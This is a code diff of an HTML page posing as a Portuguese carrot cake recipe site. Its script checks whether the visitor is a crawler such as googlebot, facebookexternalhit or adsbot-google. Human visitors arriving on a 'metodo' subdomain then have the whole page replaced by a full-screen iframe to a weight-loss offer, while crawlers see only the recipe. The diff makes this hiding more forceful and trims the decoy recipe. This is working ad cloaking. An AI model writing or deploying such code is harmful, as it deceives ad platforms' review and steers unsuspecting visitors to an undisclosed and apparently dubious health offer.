@@ -2,12 +2,31 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
     <title>Delícias da Vovó</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: auto; font-family: Arial, sans-serif; }
-        .safe-content { padding: 20px; max-width: 800px; margin: 0 auto; }
-        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; }
+        /* Força o corpo da página a ocupar 100% sem sobrar espaço */
+        html, body { 
+            margin: 0 !important; 
+            padding: 0 !important; 
+            height: 100% !important; 
+            width: 100% !important; 
+            overflow: hidden !important;
+            -webkit-overflow-scrolling: touch;
+        }
+        /* Estilo do Iframe para ocupar a tela inteira como um aplicativo */
+        #oferta-iframe { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            border: none; 
+            margin: 0; 
+            padding: 0;
+            z-index: 999999;
+        }
+        .safe-content { padding: 20px; font-family: sans-serif; }
     </style>
 </head>
 <body>
@@ -16,27 +35,19 @@
     const currentHost = window.location.hostname;
     const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
 
-    // SE for humano e entrar pelo link do anúncio, mostra a oferta adaptada ao ecrã
+    // Se entrar pelo subdomínio e não for robô, injeta o Iframe reforçado
     if (currentHost.includes('metodo') && !isBot) {
-        document.write('<iframe src="https://protocoloemagrecimentodivino.lovable.app/"></iframe>');
-        document.body.style.overflow = 'hidden';
+        document.body.innerHTML = '<iframe id="oferta-iframe" src="https://protocoloemagrecimentodivino.lovable.app/" allow="fullscreen"></iframe>';
     }
 </script>
 
 <div class="safe-content">
     <h1>O Melhor Bolo de Cenoura Perfeito</h1>
-    <p>Esta é a receita tradicional da família, fofinha e com cobertura de chocolate.</p>
-    <h3>Ingredientes Necessários:</h3>
+    <p>Esta é a receita tradicional da família...</p>
     <ul>
-        <li>3 cenouras médias raladas</li>
-        <li>3 ovos inteiros</li>
-        <li>1 xícara de óleo</li>
-        <li>2 xícaras de açúcar</li>
-        <li>2 xícaras de farinha de trigo</li>
-        <li>1 colher de sopa de fermento em pó</li>
+        <li>3 cenouras</li>
+        <li>3 ovos</li>
     </ul>
-    <h3>Modo de Preparo:</h3>
-    <p>Bata no liquidificador as cenouras, os ovos e o óleo. Em seguida, misture o açúcar e a farinha. Adicione o fermento e leve ao forno a 180°C por 40 minutos.</p>
 </div>
 
 </body>
